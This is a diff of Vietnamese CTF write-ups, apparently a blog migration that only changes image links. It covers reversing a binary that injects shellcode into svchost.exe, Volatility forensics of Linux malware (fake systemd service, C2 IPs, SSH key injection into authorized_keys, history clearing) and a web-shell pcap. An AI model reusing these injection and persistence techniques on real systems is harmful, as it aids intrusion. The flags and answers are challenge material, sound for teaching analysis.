 &lt;p&gt;&lt;strong&gt;1. Chuỗi base64&lt;/strong&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Đây là một chuỗi Base64 rất dài.&lt;/li&gt;
@@ -977,14 +977,14 @@ LABEL_9:
 &lt;p&gt;Giá trị 877020995 = 0x34544643 (ASCII: &quot;CFT4&quot;).
 Tức là dữ liệu sau khi base64 decode phải bắt đầu bằng một magic header &quot;CFT4&quot; (hay &quot;CandleFT4&quot;?).
 Nếu sai → return rỗng.
-&lt;img src=&quot;https://hackmd.io/_uploads/ryCTqURiel.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/ryCTqURiel.png&quot; alt=&quot;image&quot; /&gt;
 check header và bỏ quá 0x44 bytes lấy phần cipher check các block 16bytes xem đủ không
-&lt;img src=&quot;https://hackmd.io/_uploads/SyxSsICogx.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/SyxSsICogx.png&quot; alt=&quot;image&quot; /&gt;
 chỉ định các Provider bước init trước khi tạo &lt;em&gt;&lt;strong&gt;hash và decryption&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;3. Tính &amp;amp; kiểm tra HMAC&lt;/strong&gt;
 Sau đó, nó dùng SHA256 để derived key (pbSecret 32bytes) với salt/nonce trong cipher
-&lt;img src=&quot;https://hackmd.io/_uploads/Bk8DlwAieg.png&quot; alt=&quot;image&quot; /&gt;
-&lt;img src=&quot;https://hackmd.io/_uploads/BkkZZwCsxg.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/Bk8DlwAieg.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/BkkZZwCsxg.png&quot; alt=&quot;image&quot; /&gt;
 pbInput giống với file PEPPER =&amp;gt; file này là file cấu hình cho chương trình lấy key nhưng do file đã được chạy rồi hoặc được dump từ memory nên hardcode hoặc file đã được nhúng hardcode từ trước
 Derived Key
 Chương trình đọc file PEPPER (32 bytes secret). Từ secret này và Salt trong cipher, nó sinh ra key bằng cách băm:
@@ -996,7 +996,7 @@ K1 = key dùng cho AES-CBC decrypt.
 K2 = key dùng cho HMAC-SHA256 verify.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;4.Tính HMAC để xác thực&lt;/strong&gt;
 Nó không decrypt ngay, mà hash kiểm tra trước:
-&lt;img src=&quot;https://hackmd.io/_uploads/H1PyGDCixe.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/H1PyGDCixe.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Tại đây ta quay lai một chút ở phần ciphertext
 Format header cipher&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;[0x00..0x03]  Magic   (&quot;CGF4&quot;)    = 877020995
@@ -1019,7 +1019,7 @@ IV = block 16 bytes trong file
 Ciphertext = phần sau offset 0x44
 Giải mã theo chuẩn AES-256-CBC. Plaintext kết quả được trả về trong vùng nhớ Block.&lt;/p&gt;
 &lt;p&gt;Viết script giải mã
-&lt;img src=&quot;https://hackmd.io/_uploads/HynVDDRjle.png&quot; alt=&quot;code&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/HynVDDRjle.png&quot; alt=&quot;code&quot; /&gt;&lt;/p&gt;
 &lt;h2&gt;Quay trở lại hàm maincode ban đầu đưa ra kết luận&lt;/h2&gt;
 &lt;p&gt;Đọc tham số bet&lt;/p&gt;
 &lt;p&gt;Lấy string input từ a1 (argv-like) → convert sang số (strtoll).&lt;/p&gt;
@@ -1076,8 +1076,8 @@ pass: ptitctf2025&lt;/p&gt;
 &lt;p&gt;Bắt đầu với một mô tả khá chill chill :))&lt;/p&gt;
 &lt;h2&gt;Start&lt;/h2&gt;
 &lt;p&gt;Tại entry (Hàm start) Có gọi một số hàm lạ
-&lt;img src=&quot;https://hackmd.io/_uploads/HkvkfCAigx.png&quot; alt=&quot;image&quot; /&gt;
-&lt;img src=&quot;https://hackmd.io/_uploads/r1LaW0Asex.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/HkvkfCAigx.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/r1LaW0Asex.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Ta thấy logic khá đơn giản:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Mở socket với IP &lt;strong&gt;127.0.0.1:1337&lt;/strong&gt; Send gửi data đi&lt;/li&gt;
@@ -1085,11 +1085,11 @@ pass: ptitctf2025&lt;/p&gt;
 &lt;/ul&gt;
 &lt;h2&gt;Sub_1400248E0 (hàm khởi tạo)&lt;/h2&gt;
 &lt;p&gt;Sau khi check các hàm có một số hàm bị lỗi stack frame too long khiến IDA không thể compiled được nhưng ở hàm &lt;strong&gt;sub_1400248E0&lt;/strong&gt; dương như là một hàm khởi tạo cho runtime chứa:
-&lt;img src=&quot;https://hackmd.io/_uploads/r1sSXRRjxe.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/r1sSXRRjxe.png&quot; alt=&quot;image&quot; /&gt;
 &lt;strong&gt;&amp;amp;unk_14002F030&lt;/strong&gt; trỏ tới duy nhất một offset
-&lt;img src=&quot;https://hackmd.io/_uploads/BJ_F70Rolx.png&quot; alt=&quot;image&quot; /&gt;
-&lt;img src=&quot;https://hackmd.io/_uploads/rJQnmCAogl.png&quot; alt=&quot;image&quot; /&gt;
-&lt;img src=&quot;https://hackmd.io/_uploads/SknmcARjel.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/BJ_F70Rolx.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/rJQnmCAogl.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/SknmcARjel.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;&amp;amp;unk_14002F030 -&amp;gt; sub_140001900 -&amp;gt;  sub_140001740&lt;/strong&gt; Hàm này đáng chú ý vì nằm ngoài luồng logic kiểm tra flag, đồng thời chứa nhiều đoạn mã bất thường.&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Note : Ban đầu mình đã reverse trước và rename lại tên hàm&lt;/p&gt;
@@ -1123,7 +1123,7 @@ pass: ptitctf2025&lt;/p&gt;
 }
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Tiến hành giải mã chuỗi bytes bằng hàm &lt;strong&gt;Xor_DEADBEEF&lt;/strong&gt;
-&lt;img src=&quot;https://hackmd.io/_uploads/HJPoPAAoxl.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/HJPoPAAoxl.png&quot; alt=&quot;image&quot; /&gt;
 Theo tài liệu &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/beginthread-beginthreadex?view=msvc-170&quot;&gt;Microsoft&lt;/a&gt;, API _beginthreadex được sử dụng để tạo một thread mới tại một routine thực thi, và trong trường hợp này hàm GetProcAddress được dùng để lấy địa chỉ từ msvcrt.dll.
 Hàm sub_140024100 đóng vai trò là start address được truyền vào _beginthreadex.&lt;/p&gt;
 &lt;h2&gt;sub_140024100&lt;/h2&gt;
@@ -1327,21 +1327,21 @@ Key &lt;strong&gt;XOR 8 byte&lt;/strong&gt; dùng để giải mã &lt;strong&gt
 Tóm lại: hàm này thực hiện process injection kiểu create-remote-thread-hijack trên svchost.exe bị treo: giải mã tên API và payload, ghi shellcode vào tiến trình con, chỉnh RIP của thread chính đến shellcode, rồi resume để chạy&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;Tính toán key
-&lt;img src=&quot;https://hackmd.io/_uploads/BJfbA00sex.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/BJfbA00sex.png&quot; alt=&quot;image&quot; /&gt;
 Từ đó, ta tính được key giải mã là &lt;strong&gt;b&quot;CHATGPT&quot;&lt;/strong&gt;, dùng để dump và giải mã shellcode.
-&lt;img src=&quot;https://hackmd.io/_uploads/HyBN0CAjgx.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/HyBN0CAjgx.png&quot; alt=&quot;image&quot; /&gt;
 Tôi nạp phần shellcode vào BinaryNinja và thiết lập base address là 0x1B000.
 Khi thực thi, hàm sub_140024100 đặt con trỏ lệnh (RIP) đến địa chỉ lpBaseAddress + 2432. Với cấu hình base address = 0x1B000, địa chỉ này trỏ đến offset 0x1B980, chính là vị trí bắt đầu của main code để phân tích.
-&lt;img src=&quot;https://hackmd.io/_uploads/HkXhkkkngg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/HkXhkkkngg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Với các logic code quen thuộc đã được sử dụng ở file ban đầu giúp ta dễ dàng phân tích hơn vẫn sử dụng lại các hàm như Xor_DEADBEEF và PEB_ldr, parser_returnAddrAPI&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Note: trong hình trên tôi đã rename lại tất cả biến với việc xor_deadbeef với các byteraw&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;Đầu tiên, shellcode load hai thư viện ws2_32.dll và kernel32.dll để resolve các API cần thiết.
 Mở socket với các API như (WSASTARTUP, socket, inet_addr, htons, bind, listen, recv, send)
-&lt;img src=&quot;https://hackmd.io/_uploads/SJZwW1khll.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/SJZwW1khll.png&quot; alt=&quot;image&quot; /&gt;
 Tiếp theo, shellcode load msvcrt.dll, tạo key RC4 thông qua sub_1b520, và dùng nó để giải mã payload đã được hardcode.
-&lt;img src=&quot;https://hackmd.io/_uploads/HkF1fJJhll.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/HkF1fJJhll.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Tóm tắt lại tiến trình con svchost.exe:&lt;/strong&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Resolve DLL/API bằng PEB + tên bị XOR&lt;/li&gt;
@@ -1370,14 +1370,14 @@ Nhận dữ liệu và xử lý “gói” RC4&lt;/li&gt;
 &lt;strong&gt;-&amp;gt; Hardcode buffer sau khi decryption RC4 là flag dùng để kiểm tra input từ tiến trình cha.&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h2&gt;Decryption blob (0x1e)&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Sko87J1ngl.png&quot; alt=&quot;code&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/Sko87J1ngl.png&quot; alt=&quot;code&quot; /&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;Output:
 Cipher (hex): 7a5c600ca5d7e7480316ed0e5bb2d9bf01eec9bdbcc1b94c0dc67fb3a1eb
 Key (hex)   : 546423423634  / ASCII: Td#B64
 Plain (hex) : 505449544354467b346e74695f636834745f6750745f5072305f6b6b6b7d
 Plain (ascii): PTITCTF{4nti_ch4t_gPt_Pr0_kkk}
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rkfyTQW3xl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/rkfyTQW3xl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Tóm tắt toàn bộ chương trình:&lt;/strong&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Tiến trình cha khởi tạo tiến trình con svchost.exe (chứa logic check flag input)&lt;/li&gt;
@@ -1390,7 +1390,7 @@ Plain (ascii): PTITCTF{4nti_ch4t_gPt_Pr0_kkk}
 https://drive.google.com/file/d/1aQ4lWR_vrqWwPLwf6gJj2FDFbbfyGNHB/view?usp=drive_link
 The chall name says it all !
 https://www.deadsec.xyz/instances/f-forensics
-&lt;img src=&quot;https://hackmd.io/_uploads/B1bAkVIDex.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/B1bAkVIDex.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;Trong team của tôi đã không có thời gian để solve challenge này vì ngày hôm sau chúng tôi có một cuộc thi CTF onsite supper guessy :))
 Nên bây giờ tôi sẽ làm lại&lt;/p&gt;
@@ -1487,11 +1487,11 @@ nhưng tới câu 3 đã tốn rất nhiều thời gian vì các plugin liên q
 &lt;li&gt;File Layer (Responsible for operating on the snapshot file)&lt;/li&gt;
 &lt;li&gt;Swap (Implements analysis for the swap partition)&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/ryc9RBUvgx.png&quot; alt=&quot;image&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/ryc9RBUvgx.png&quot; alt=&quot;image&quot; /&gt;
 &lt;strong&gt;The Kernel Layer is just a Virtual Layer (a layer that contains virtual addresses)&lt;/strong&gt;
-&lt;img src=&quot;https://hackmd.io/_uploads/r17T0SUvex.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/r17T0SUvex.png&quot; alt=&quot;image&quot; /&gt;
 kiểm tra các lớp layers của file memory
-&lt;img src=&quot;https://hackmd.io/_uploads/B1bEgLLPel.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/B1bEgLLPel.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;-&amp;gt; đây là một file ELF snapshort&lt;/strong&gt;
 &lt;strong&gt;RAW vs ELF snapshot&lt;/strong&gt;&lt;/p&gt;
 &lt;ul&gt;
@@ -1518,28 +1518,28 @@ Dựa vào sơ đồ:&lt;/p&gt;
 &lt;p&gt;✅ Để đọc đúng Virtual Address của từng process (như start_code, vm_area_struct, …), &lt;strong&gt;ta cần tạo thêm một Virtual Layer riêng biệt cho process đó&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;Và file memory mà ta đang phân tích là định dạng ELFSnapshort nên nó sẽ đi sang một lớp trung gian mới tới lớp memory layer là lớp base layer
 như khái niệm trên memory layer mới phản ánh đúng offset address trên disk&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SJZbBD8vle.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Hy_ufd8vgx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BJF9dwLDxg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/SJZbBD8vle.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/Hy_ufd8vgx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/BJF9dwLDxg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Tiến hành xác định malicious process &quot;malware-f&quot;
-&lt;img src=&quot;https://hackmd.io/_uploads/Hk3ZiSIvlg.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/Hk3ZiSIvlg.png&quot; alt=&quot;image&quot; /&gt;
 So sánh offset address từ pslist
-&lt;img src=&quot;https://hackmd.io/_uploads/H14UoSUwxx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/H14UoSUwxx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;h3&gt;Dump process&lt;/h3&gt;
 &lt;p&gt;Trong Linux kernel, task_struct là cấu trúc dữ liệu đại diện cho một process. Trường mm (memory descriptor) là con trỏ tới một cấu trúc mm_struct, đại diện cho không gian địa chỉ ảo của process. Đây là nơi kernel lưu thông tin về mappings (code, data, stack, v.v.).&lt;/p&gt;
 &lt;p&gt;Xác định địa chỉ bắt đầu và địa chỉ cuối của file
-&lt;img src=&quot;https://hackmd.io/_uploads/H18Ot8UPxx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/H18Ot8UPxx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Lấy raw data ở layer_name
-&lt;img src=&quot;https://hackmd.io/_uploads/S1jgpSUvxl.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/S1jgpSUvxl.png&quot; alt=&quot;image&quot; /&gt;
 Đã bị error PagedInvalidAddressExcaption chuyển sang base_layer
-&lt;img src=&quot;https://hackmd.io/_uploads/S1IU6H8wlg.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/S1IU6H8wlg.png&quot; alt=&quot;image&quot; /&gt;
 Chuyển sang memory layer
-&lt;img src=&quot;https://hackmd.io/_uploads/ryYYTrIvll.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/ryYYTrIvll.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;h3&gt;Vì sao lỗi xảy ra?&lt;/h3&gt;
 &lt;p&gt;Các khái niệm trước đã nói rõ mỗi process trong virtual address space sẽ được mapping qua memory một cách khác nhau (cũng như là thế giới quan khác nhau) xem lại &lt;strong&gt;Virtual Layer Diagram&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Kết luận:&lt;/strong&gt;
 Giải pháp khắc phục, thay vì đọc tự động từ layer_name ra ta nên dùng Volatility 3 API đúng cách để tạo layer không gian địa chỉ người dùng của tiến trình:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SkEOZILDlx.png&quot; alt=&quot;image&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/SkEOZILDlx.png&quot; alt=&quot;image&quot; /&gt;
 lúc này ta đã có thêm một layer của process sử dụng layer này để dump file
 demo:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;layer = self.context.layers[proc_layer].mapp
@@ -1562,19 +1562,19 @@ layer_name: Tên layer vật lý chứa dữ liệu thực tế
 Check nhanh với 16 bytes đầu
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Kiểm tra thử data tại memory layer
-&lt;img src=&quot;https://hackmd.io/_uploads/BJ34kdLvlg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/BJ34kdLvlg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Tiến hành dump file
-&lt;img src=&quot;https://hackmd.io/_uploads/B1pbfUUPex.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rkaXMUUwlx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/B1pbfUUPex.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/rkaXMUUwlx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;bây giờ đã không còn lỗi nữa check file&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;┌──(thong㉿MSI)-[/mnt/c/users/tttho/downloads/CTFchall/hacktheon/mem]
 └─$ file malware-f
 malware-f: data
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rkACdI8Pgl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/rkACdI8Pgl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;file đã bị mất đi header kiểm tra lại offset address file với plugin linux.proc.Maps để xác định các offset sau khi mapping&lt;/p&gt;
 &lt;p&gt;Plugin linux.proc.Maps hiển thị Virtual Memory Mappings của từng tiến trình giống với nội dung /proc/[pid]/maps&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BkB-d88Plx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/BkB-d88Plx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Clearly the base address of this file is started at 0x55bde0168000 but When I trace start address in volshell it displayed at 0x55bde0169000 we have lost 1000 bytes at header ELF files, We dump it again from 0x55bde0168000-0x55bde016e0000&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;[layer_name]&amp;gt; elf_data = layer.read(0x55bde0168000,0x6000)
          ...:
@@ -1618,15 +1618,15 @@ b6e7756044984f2f5a0de3be9e6f2dbaf26ef1d0d4ebaddd35a7c1e21cf8a9c1  malware-f2
 b6e7756044984f2f5a0de3be9e6f2dbaf26ef1d0d4ebaddd35a7c1e21cf8a9c1  malware-f
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;reverse file with IDAPro
-&lt;img src=&quot;https://hackmd.io/_uploads/HkxP9ILPle.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/HkxP9ILPle.png&quot; alt=&quot;image&quot; /&gt;
 thấy các string liên quan đến sandbox như hypervisor and VMware xref tới kiểm tra
-&lt;img src=&quot;https://hackmd.io/_uploads/HyCFc8IDlg.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/HyCFc8IDlg.png&quot; alt=&quot;image&quot; /&gt;
 đây rõ ràng là anti sandbox&lt;/p&gt;
 &lt;h3&gt;Answer 3 : /proc/cpuinfo&lt;/h3&gt;
 &lt;h3&gt;4. The malware installed a fake service as a persistence mechanism, what was the service name ?&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Hk2kiIIwgg.png&quot; alt=&quot;image&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/Hk2kiIIwgg.png&quot; alt=&quot;image&quot; /&gt;
 tiếp tục check string
-&lt;img src=&quot;https://hackmd.io/_uploads/HyLQoLUvxe.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/HyLQoLUvxe.png&quot; alt=&quot;image&quot; /&gt;
 → Malware tạo một file service systemd giả mạo tên: &lt;strong&gt;dbus.service&lt;/strong&gt;
 Sau đó nó tạo symbolic link từ file đó sang:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;/etc/systemd/system/.dbus.service
@@ -1637,26 +1637,26 @@ Sau đó nó tạo symbolic link từ file đó sang:&lt;/p&gt;
 &lt;p&gt;để kích hoạt service giả mạo đó.&lt;/p&gt;
 &lt;h3&gt;Answer 4 : .dbus.service&lt;/h3&gt;
 &lt;h3&gt;5. The malware connects to two C2 IPs, what are they ? (ip1 - ip2)&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rJuQh8Ivxx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/rJuQh8Ivxx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;h3&gt;Answer 5 : 185.143.223.107 - 45.133.216.219&lt;/h3&gt;
 &lt;h3&gt;6.The malware copies itself and imitates a library, where is it stored ?&lt;/h3&gt;
 &lt;p&gt;copy chính nó chúng ta sẽ target đến /proc/self/exe
-&lt;img src=&quot;https://hackmd.io/_uploads/HJZs28Ivlx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/HJZs28Ivlx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;h3&gt;Answer 6: /lib/.X11-unix/.X1&lt;/h3&gt;
 &lt;h3&gt;7. What command does the malware use to make the new copied file immutable ?&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BkIR28Lvee.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/BkIR28Lvee.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;sub_1886(&quot;/lib/.X11-unix/.X1&quot;, 1LL);
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Đây là khi gọi hàm truyền 1 -&amp;gt; chattr +i&lt;/p&gt;
 &lt;h3&gt;Answer 7 : chattr +i&lt;/h3&gt;
 &lt;h3&gt;8. What three debugging techniques does the malware specifically check for in its anti-debug routine ? (1-2-3)&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rk5s68Lwge.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/rk5s68Lwge.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;h3&gt;Answer 8 : LD_PRELOAD-strace-ltrace&lt;/h3&gt;
 &lt;h3&gt;9. Looks like the malware is injecting an ssh key, what type is this key ?&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HyUR6UUDge.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/HyUR6UUDge.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;h3&gt;Answer 9: ssh-ed25519&lt;/h3&gt;
 &lt;h3&gt;10. Where is that key being injected ? (full path)&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rygGCLUPel.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/rygGCLUPel.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;h3&gt;Answer 10 : /root/.ssh/authorized_keys&lt;/h3&gt;
 &lt;h3&gt;11. What command is the malware using to clear all traces of executed commands ?&lt;/h3&gt;
 &lt;pre&gt;&lt;code&gt;__int64 sub_1E27()
@@ -1675,7 +1675,7 @@ Sau đó nó tạo symbolic link từ file đó sang:&lt;/p&gt;
 &lt;h3&gt;Answer 11: history -c&lt;/h3&gt;
 &lt;h3&gt;12. How often is the log cleaning function being executed ? (in seconds)&lt;/h3&gt;
 &lt;p&gt;Hàm ở câu trên là hàm xóa log vì vậy ở hàm main có một vòng lập while true
-&lt;img src=&quot;https://hackmd.io/_uploads/rJtJJwLPxe.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/rJtJJwLPxe.png&quot; alt=&quot;image&quot; /&gt;
 sleep(3600) trước khi xóa
 -&amp;gt; 3600&lt;/p&gt;
 &lt;h3&gt;Answer 12 : 3600&lt;/h3&gt;
@@ -1685,7 +1685,7 @@ sleep(3600) trước khi xóa
 Decription : A motivated APT group has breached our company and utilized custom tooling. We&apos;ve identified the implants on compromised systems and remediated the infection using advanced AntiVirus X. However, one server seems clean but has been exhibiting suspicious traffic. Can you spot something we could have missed while cleaning this system?&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h2&gt;Xử lý file pcap&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HyUa_qAIlx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/HyUa_qAIlx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;Đầu tiên ta thấy Client gửi request tới server thông qua format multi data và ta thấy client đã Post một file upload.apsx thông qua /upload
@@ -1702,9 +1702,9 @@ tại lúc xử lý file tôi thấy nó sử dụng một Class Assembly.Load()
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;r là hardcode
-&lt;img src=&quot;https://hackmd.io/_uploads/HJtyO90Lge.jpg&quot; alt=&quot;payload&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/HJtyO90Lge.jpg&quot; alt=&quot;payload&quot; /&gt;
 trích xuất ra file payload.exe check file nhanh với die thì đây là file .NET load vào ILSPY để đọc source
-&lt;img src=&quot;https://hackmd.io/_uploads/S1i4O90Lxx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/S1i4O90Lxx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;RequestForm[&quot;data&quot;] là phân vùng bị enc code&lt;/p&gt;
@@ -1724,27 +1724,27 @@ trích xuất ra file payload.exe check file nhanh với die thì đây là file
 &lt;/ul&gt;
 &lt;h2&gt;Decryption Traffic&lt;/h2&gt;
